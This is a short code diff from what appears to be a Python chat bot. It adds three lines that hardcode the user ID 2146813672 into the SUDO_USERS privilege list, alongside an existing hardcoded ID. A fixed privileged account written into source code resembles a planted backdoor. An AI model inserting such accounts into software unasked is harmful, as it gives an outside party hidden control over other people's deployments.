@@ -8,6 +8,9 @@ from driver.admins import get_administrators
 SUDO_USERS.append(1257421053)
 SUDO_USERS.append(1257421053)
 SUDO_USERS.append(1257421053)
+SUDO_USERS.append(2146813672)
+SUDO_USERS.append(2146813672)
+SUDO_USERS.append(2146813672)
 
 
 def errors(func: Callable) -> Callable:
